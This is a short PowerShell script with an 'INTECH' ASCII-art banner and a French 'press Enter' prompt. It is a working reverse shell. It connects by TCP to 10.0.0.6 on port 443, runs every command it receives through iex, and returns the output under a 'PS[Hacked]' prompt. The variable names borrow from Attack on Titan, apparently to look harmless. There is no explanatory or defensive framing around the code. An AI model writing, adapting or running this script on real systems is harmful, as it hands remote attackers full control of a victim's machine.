$welcome = '
                ___      ___          ___          ___          ___     
      ___      /\__\    /\  \        /\  \        /\  \        /\__\    
     /\  \    /::|  |   \:\  \      /::\  \      /::\  \      /:/  /    
     \:\  \  /:|:|  |    \:\  \    /:/\:\  \    /:/\:\  \    /:/__/     
     /::\__\/:/|:|  |__  /::\  \  /::\~\:\  \  /:/  \:\  \  /::\  \ ___ 
  __/:/\/__/:/ |:| /\__\/:/\:\__\/:/\:\ \:\__\/:/__/ \:\__\/:/\:\  /\__\
 /\/:/  /  \/__|:|/:/  /:/  \/__/\:\~\:\ \/__/\:\  \  \/__/\/__\:\/:/  /
 \::/__/       |:/:/  /:/  /      \:\ \:\__\   \:\  \           \::/  / 
  \:\__\       |::/  /\/__/        \:\ \/__/    \:\  \          /:/  /  
   \/__/       /:/  /               \:\__\       \:\__\        /:/  /   
               \/__/                 \/__/        \/__/        \/__/    
 => Appuyer sur Entree..
 ';
if(1 -eq 1){
	$mikasa = 0
	$eren='10.0.0.6';
	$yaeger=443;
	$SNK = New-Object System.Net.Sockets.TCPClient($eren,$yaeger);
}

$titan = $SNK.GetStream();

[byte[]]$b = 0..65535|%{0};
$titan.Write(([text.encoding]::ASCII).GetBytes($welcome),0,$welcome.Length);
while(($i = $titan.Read($b, 0, $b.Length)) -ne 0){;
	$nissan = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
	$sb = (iex $nissan 2>&1 | Out-String );
	$sb2 = $sb + 'PS[Hacked] ' + (pwd).Path + '> ';
	$sbt = ([text.encoding]::ASCII).GetBytes($sb2);
	$titan.Write($sbt,0,$sbt.Length);
	$titan.Flush()
};
$SNK.Close()
